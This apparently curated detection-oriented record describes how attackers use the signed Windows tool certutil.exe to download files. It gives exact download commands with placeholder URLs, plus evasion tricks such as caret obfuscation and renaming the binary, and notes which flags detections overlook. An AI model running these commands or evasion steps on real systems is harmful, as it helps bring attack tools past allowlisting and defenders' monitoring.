title: LOLBAS — Certutil.exe download primitives
provenance: curated — commands verbatim from LOLBAS / Atomic Red Team T1105 (fetched 2026-07-14)
tactic: Command and Control / Ingress Tool Transfer
text: certutil.exe is a signed Microsoft binary that can download arbitrary files, living off the land past application allowlisting. Download primitives: 'certutil -urlcache -split -f <url> <out>' and 'certutil -verifyctl -split -f <url>'. Also '-urlcache' without '-split', and the '-URL' GUI flag. Evasion notes an attacker combines with: casing changes, caret obfuscation in the command token (c^ertutil), and renaming the binary (see Rename System Utilities T1036.003). Any detection that lists only '-urlcache'/'-verifyctl' should also consider these alternate download flags.
